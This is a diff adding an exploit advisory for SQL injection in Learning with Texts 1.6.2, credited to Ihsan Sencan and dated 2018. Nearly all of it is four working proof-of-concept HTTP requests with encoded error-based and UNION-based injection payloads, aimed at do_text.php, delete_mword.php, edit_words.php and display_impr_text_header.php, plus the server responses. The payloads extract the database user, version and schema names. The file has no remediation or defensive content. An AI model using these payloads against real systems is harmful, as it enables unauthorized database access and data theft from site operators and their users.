@@ -1,0 +1,108 @@
+# Exploit Title: Learning with Texts 1.6.2 - 'start' SQL Injection
+# Dork: N/A
+# Date: 2018-10-18
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://lwt.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/lwt/files/latest/download
+# Version: 1.6.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/do_text.php?start=[SQL]
+
+GET /[PATH]/do_text.php?start=1%20aND%20(SeLecT%2066%20FroM(SeLecT%20couNT(*),coNcaT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SeLecT%20(eLT(66=66,1))),0x716b6b6a71,FLoor(raND(0)*2))x%20FroM%20INForMaTIoN_ScHeMa.PLuGINS%20GrouP%20BY%20x)a) HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 00:15:33 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=tqrrq29el6irt0blfl2vniiki4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1243
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/delete_mword.php?wid=[SQL]
+
+GET /[PATH]/delete_mword.php?wid=%27%27%20And%20EXTraCTVALUE(22,CONcaT(0x5c,version(),(SEleCT%20(ELT(1=1,1))),database()))--%20Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 00:22:13 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=3cmjrq63ttrcr53skm7jbrs4j1; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 868
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/edit_words.php?new=1&lang=[SQL]
+
+GET /[PATH]/edit_words.php?new=1&lang=-11%20UnioN%20SElect%20NULL,NULL,CONCAT((SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x))--++Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=3cmjrq63ttrcr53skm7jbrs4j1
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 00:31:33 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Last-Modified: Thu, 18 Oct 2018 00:31:33 GMT
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 4)
+# http://localhost/[PATH]/display_impr_text_header.php?text=[SQL]
+
+GET /[PATH]/display_impr_text_header.php?text=-11%20UNION%20ALL%20SELECT%20%20666666,%20666666,666666,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=3cmjrq63ttrcr53skm7jbrs4j1
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 00:44:43 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Last-Modified: Thu, 18 Oct 2018 00:44:43 GMT
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
